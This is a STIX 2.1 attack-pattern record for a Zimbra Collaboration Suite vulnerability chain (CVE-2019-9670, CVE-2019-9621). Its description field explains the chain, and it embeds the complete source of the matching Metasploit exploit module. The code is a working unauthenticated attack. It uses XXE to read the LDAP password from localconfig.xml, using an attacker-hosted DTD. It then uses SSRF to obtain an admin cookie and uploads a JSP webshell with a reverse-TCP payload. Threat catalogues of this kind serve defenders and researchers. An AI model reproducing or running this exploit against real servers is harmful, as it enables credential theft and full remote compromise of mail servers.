{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa4cca23-adc5-41e3-b900-ba5225bd4153",
    "created": "2024-08-14T17:00:09.16337Z",
    "modified": "2024-08-14T17:00:09.163374Z",
    "name": "Zimbra Collaboration Autodiscover Servlet XXE and ProxyServlet SSRF",
    "description": " This module exploits an XML external entity vulnerability and a server side request forgery to get unauthenticated code execution on Zimbra Collaboration Suite. The XML external entity vulnerability in the Autodiscover Servlet is used to read a Zimbra configuration file that contains an LDAP password for the 'zimbra' account. The zimbra credentials are then used to get a user authentication cookie with an AuthRequest message. Using the user cookie, a server side request forgery in the Proxy Servlet is used to proxy an AuthRequest with the 'zimbra' credentials to the admin port to retrieve an admin cookie. After gaining an admin cookie the Client Upload servlet is used to upload a JSP webshell that can be triggered from the web server to get command execution on the host. The issues reportedly affect Zimbra Collaboration Suite v8.5 to v8.7.11.  This module was tested with Zimbra Release 8.7.1.GA.1670.UBUNTU16.64 UBUNTU16_64 FOSS edition. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zimbra_xxe_rce.rb",
            "external_id": "zimbra_xxe_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9670"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9621"
        },
        {
            "source_name": "reference",
            "url": "https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zimbra Collaboration Autodiscover Servlet XXE and ProxyServlet SSRF',\n      'Description'    => %q{\n        This module exploits an XML external entity vulnerability and a\n        server side request forgery to get unauthenticated code execution\n        on Zimbra Collaboration Suite. The XML external entity vulnerability\n        in the Autodiscover Servlet is used to read a Zimbra configuration\n        file that contains an LDAP password for the 'zimbra' account. The\n        zimbra credentials are then used to get a user authentication cookie\n        with an AuthRequest message. Using the user cookie, a server side request\n        forgery in the Proxy Servlet is used to proxy an AuthRequest with\n        the 'zimbra' credentials to the admin port to retrieve an admin\n        cookie. After gaining an admin cookie the Client Upload servlet is\n        used to upload a JSP webshell that can be triggered from the web\n        server to get command execution on the host. The issues reportedly\n        affect Zimbra Collaboration Suite v8.5 to v8.7.11.\n\n        This module was tested with Zimbra Release 8.7.1.GA.1670.UBUNTU16.64\n        UBUNTU16_64 FOSS edition.\n      },\n      'Author'         =>\n        [\n          'An Trinh',         # Discovery\n          'Khanh Viet Pham',  # Discovery\n          'Jacob Robles'      # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2019-9670'],\n          ['CVE', '2019-9621'],\n          ['URL', 'https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultOptions' => {\n        'RPORT' => 8443,\n        'SSL' => true,\n        'PAYLOAD' => 'java/jsp_shell_reverse_tcp'\n      },\n      'Stance'         => Stance::Aggressive,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2019-03-13' # Blog post date\n    ))\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'Zimbra application base path', '/']),\n      OptInt.new('HTTPDELAY', [true, 'Number of seconds the web server will wait before termination', 10])\n    ]\n  end\n\n  def xxe_req(data)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, '/autodiscover'),\n      'encode_params' => false,\n      'data' => data\n    })\n    fail_with(Failure::Unknown, 'Request failed') unless res && res.code == 503\n    res\n  end\n\n  def soap_discover(check_soap=false)\n    xml = REXML::Document.new\n\n    xml.add_element('Autodiscover')\n    xml.root.add_element('Request')\n\n    req = xml.root.elements[1]\n\n    req.add_element('EMailAddress')\n    req.add_element('AcceptableResponseSchema')\n\n    replace_text = 'REPLACE'\n    req.elements['EMailAddress'].text = Faker::Internet.email\n    req.elements['AcceptableResponseSchema'].text = replace_text\n\n    doc = rand_text_alpha_lower(4..8)\n    entity = rand_text_alpha_lower(4..8)\n    local_file = '/etc/passwd'\n\n    res = \"<!DOCTYPE #{doc} [<!ELEMENT #{doc} ANY>\"\n    if check_soap\n      local = \"file://#{local_file}\"\n      res << \"<!ENTITY #{entity} SYSTEM '#{local}'>]>\"\n      res << \"#{xml.to_s.sub(replace_text, \"&#{entity};\")}\"\n    else\n      local = \"http://#{srvhost_addr}:#{srvport}#{@service_path}\"\n      res << \"<!ENTITY % #{entity} SYSTEM '#{local}'>\"\n      res << \"%#{entity};]>\"\n      res << \"#{xml.to_s.sub(replace_text, \"&#{@ent_data};\")}\"\n    end\n    res\n  end\n\n  def soap_auth(zimbra_user, zimbra_pass, admin=true)\n    urn = admin ? 'urn:zimbraAdmin' : 'urn:zimbraAccount'\n    xml = REXML::Document.new\n\n    xml.add_element(\n      'soap:Envelope',\n      {'xmlns:soap'  => 'http://www.w3.org/2003/05/soap-envelope'}\n    )\n\n    xml.root.add_element('soap:Body')\n    body = xml.root.elements[1]\n    body.add_element(\n      'AuthRequest',\n      {'xmlns' => urn}\n    )\n\n    zimbra_acc = body.elements[1]\n    zimbra_acc.add_element(\n      'account',\n      {'by' => 'adminName'}\n    )\n    zimbra_acc.add_element('password')\n\n    zimbra_acc.elements['account'].text  = zimbra_user\n    zimbra_acc.elements['password'].text = zimbra_pass\n\n    xml.to_s\n  end\n\n  def cookie_req(data)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, '/service/soap/'),\n      'data' => data\n    })\n    fail_with(Failure::Unknown, 'Request failed') unless res && res.code == 200\n    res\n  end\n\n  def proxy_req(data, auth_cookie)\n    target = \"https://127.0.0.1:7071#{normalize_uri(target_uri, '/service/admin/soap/AuthRequest')}\"\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, '/service/proxy/'),\n      'vars_get' => {'target' => target},\n      'cookie' => \"ZM_ADMIN_AUTH_TOKEN=#{auth_cookie}\",\n      'data' => data,\n      'headers' => {'Host' => \"#{datastore['RHOST']}:7071\"}\n    })\n    fail_with(Failure::Unknown, 'Request failed') unless res && res.code == 200\n    res\n  end\n\n  def upload_file(file_name, contents, cookie)\n    data = Rex::MIME::Message.new\n    data.add_part(file_name, nil, nil, 'form-data; name=\"filename1\"')\n    data.add_part(contents, 'application/octet-stream', nil, \"form-data; name=\\\"clientFile\\\"; filename=\\\"#{file_name}\\\"\")\n    data.add_part(\"#{rand_text_numeric(2..5)}\", nil, nil, 'form-data; name=\"requestId\"')\n    post_data = data.to_s\n\n    send_request_cgi({\n      'method'          => 'POST',\n      'uri'             => normalize_uri(target_uri, '/service/extension/clientUploader/upload'),\n      'ctype'           => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'            => post_data,\n      'cookie'          => cookie\n    })\n  end\n\n  def check\n    begin\n      res = xxe_req(soap_discover(true))\n    rescue Msf::Exploit::Failed\n      return CheckCode::Unknown\n    end\n\n    if res.body.include?('zimbra')\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Unknown\n  end\n\n  def on_request_uri(cli, req)\n    ent_file = rand_text_alpha_lower(4..8)\n    ent_eval = rand_text_alpha_lower(4..8)\n\n    dtd =  <<~HERE\n    <!ENTITY % #{ent_file} SYSTEM \"file:///opt/zimbra/conf/localconfig.xml\">\n    <!ENTITY % #{ent_eval} \"<!ENTITY #{@ent_data} '<![CDATA[%#{ent_file};]]>'>\">\n    %#{ent_eval};\n    HERE\n    send_response(cli, dtd)\n  end\n\n  def primer\n    datastore['SSL'] = @ssl\n    res = xxe_req(soap_discover)\n    fail_with(Failure::UnexpectedReply, 'Password not found') unless res.body =~ /ldap_password.*?value&gt;(.*?)&lt;\\/value/m\n    password = $1\n    username = 'zimbra'\n\n    print_good(\"Password found: #{password}\")\n\n    data = soap_auth(username, password, false)\n    res = cookie_req(data)\n\n    fail_with(Failure::NoAccess, 'Failed to authenticate') unless res.get_cookies =~ /ZM_AUTH_TOKEN=([^;]+;)/\n    auth_cookie = $1\n\n    print_good(\"User cookie retrieved: ZM_AUTH_TOKEN=#{auth_cookie}\")\n\n    data = soap_auth(username, password)\n    res = proxy_req(data, auth_cookie)\n\n    fail_with(Failure::NoAccess, 'Failed to authenticate') unless res.get_cookies =~ /(ZM_ADMIN_AUTH_TOKEN=[^;]+;)/\n    admin_cookie = $1\n\n    print_good(\"Admin cookie retrieved: #{admin_cookie}\")\n\n    stager_name = \"#{rand_text_alpha(8..16)}.jsp\"\n    print_status('Uploading jsp shell')\n    res = upload_file(stager_name, payload.encoded, admin_cookie)\n\n    fail_with(Failure::Unknown, \"#{peer} - Unable to upload stager\") unless res && res.code == 200\n    # Only shell sessions are supported\n    register_file_for_cleanup(\"$(find /opt/zimbra/ -regex '.*downloads/.*#{stager_name}' -type f)\")\n    register_file_for_cleanup(\"$(find /opt/zimbra/ -regex '.*downloads/.*#{stager_name[0...-4]}.*1StreamConnector.class' -type f)\")\n    register_file_for_cleanup(\"$(find /opt/zimbra/ -regex '.*downloads/.*#{stager_name[0...-4]}.*class' -type f)\")\n    register_file_for_cleanup(\"$(find /opt/zimbra/ -regex '.*downloads/.*#{stager_name[0...-4]}.*java' -type f)\")\n\n    print_status(\"Executing payload on /downloads/#{stager_name}\")\n    res = send_request_cgi({\n      'uri'             => normalize_uri(target_uri, \"/downloads/#{stager_name}\"),\n      'cookie'          => admin_cookie\n    })\n  end\n\n  def exploit\n    @ent_data = rand_text_alpha_lower(4..8)\n    @ssl = datastore['SSL']\n    datastore['SSL'] = false\n    Timeout.timeout(datastore['HTTPDELAY']) { super }\n  rescue Timeout::Error\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-13 # Blog post date",
    "x_mitre_platforms": [
        "['linux']"
    ]
}